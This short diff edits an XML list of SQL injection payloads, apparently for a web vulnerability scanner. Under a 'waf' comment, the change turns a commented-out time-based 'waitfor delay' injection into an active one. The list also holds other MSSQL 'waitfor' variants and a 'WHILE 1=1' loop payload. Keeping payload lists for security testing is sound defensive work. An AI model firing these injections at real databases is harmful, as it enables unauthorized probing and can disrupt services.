@@ -32,7 +32,7 @@
         <!--waf-->
         <!--<payload value="'%20WHILE%201=1%20PRINT%201&#45;&#45;&#45;&#45;"/>-->
         <payload value="'%20WHILE%201=1%20CONTINUE---s"/>
-        <!--<payload value="';waitfor%20delay%20'0:0:5'%20&#45;&#45;s"/>-->
+        <payload value="'%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value="%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value=")%20waitfor%20delay%20'0:0:5'%20--s"/>
         <payload value="')%20waitfor%20delay%20'0:0:5'%20--s"/>
